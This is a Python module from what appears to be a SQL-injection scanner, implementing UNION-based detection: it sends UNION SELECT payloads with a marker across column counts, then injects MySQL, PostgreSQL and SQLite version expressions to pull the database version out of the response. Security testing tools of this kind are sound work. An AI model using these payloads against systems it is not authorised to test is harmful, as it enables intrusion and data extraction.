"""UNION-based detection.

Boolean/error/time only prove a parameter is *injectable*. UNION proves *impact*: we
append a `UNION SELECT` that reflects a unique marker into the response, which confirms
the parameter reaches the query and that we can read data back out. When the marker
reflects, we make one more request that pulls the DB version into the reflected column —
actual data exfiltration, the strongest evidence a finding is real (and the kind of proof
a bug-bounty triager pays out on).

Cost-aware: this runs only after the cheaper error/boolean detectors miss, and stops at
the first column count that reflects.
"""

from __future__ import annotations

import re
from typing import Optional, Tuple

from ..core.target import Finding, InjectionPoint, Request
from ..payloads.data import UNION_COMMENT, UNION_MAX_COLUMNS, UNION_PREFIXES
from .base import BaseDetector

# A distinctive token that is very unlikely to occur naturally in a response.
_MARKER = "sqlIntelUNIONx7a3"
# Sentinels that bracket an extracted value so we can regex it back out cleanly.
_VL, _VR = "qLv9<<", ">>9vLq"

# (dbms, SQL expression yielding the version wrapped in our sentinels). CONCAT for MySQL,
# `||` string concat for PostgreSQL/SQLite.
_VERSION_EXPRS = [
    ("MySQL", f"CONCAT('{_VL}',@@version,'{_VR}')"),
    ("PostgreSQL", f"('{_VL}'||version()||'{_VR}')"),
    ("SQLite", f"('{_VL}'||sqlite_version()||'{_VR}')"),
]


class UnionBasedDetector(BaseDetector):
    name = "union-based"

    def test(self, req: Request, point: InjectionPoint) -> Optional[Finding]:
        if _MARKER in self.baseline.text:  # pathological; can't distinguish reflection
            return None

        for prefix in UNION_PREFIXES:
            for ncols in range(1, UNION_MAX_COLUMNS + 1):
                cols = ",".join([f"'{_MARKER}'"] * ncols)
                payload = f"{prefix} UNION SELECT {cols}{UNION_COMMENT}"
                resp = self.client.send(
                    req, mutation={point.param: self._mutate_value(point, payload)}
                )
                if not resp.ok:
                    continue
                if _MARKER in resp.text:
                    dbms, version = self._extract_version(req, point, prefix, ncols)
                    return Finding(
                        injection_point=point,
                        technique=self.name,
                        dbms=dbms,
                        payload=payload,
                        evidence=(
                            f"reflected UNION marker with {ncols} column(s)"
                            + (f"; extracted version={version!r}" if version else "")
                        ),
                        confidence=0.97 if version else 0.9,
                        # Pulling real data out is impact-level proof; a bare reflected
                        # marker is strong but we leave final proof to the verifier.
                        proven=bool(version),
                    )
        return None

    def _extract_version(
        self, req: Request, point: InjectionPoint, prefix: str, ncols: int
    ) -> Tuple[Optional[str], Optional[str]]:
        """Replace the marker columns with a version expression and read it back."""
        pattern = re.compile(re.escape(_VL) + r"(.*?)" + re.escape(_VR), re.DOTALL)
        for dbms, expr in _VERSION_EXPRS:
            cols = ",".join([expr] * ncols)
            payload = f"{prefix} UNION SELECT {cols}{UNION_COMMENT}"
            resp = self.client.send(
                req, mutation={point.param: self._mutate_value(point, payload)}
            )
            if not resp.ok:
                continue
            m = pattern.search(resp.text)
            if m:
                return dbms, m.group(1)
        return None, None
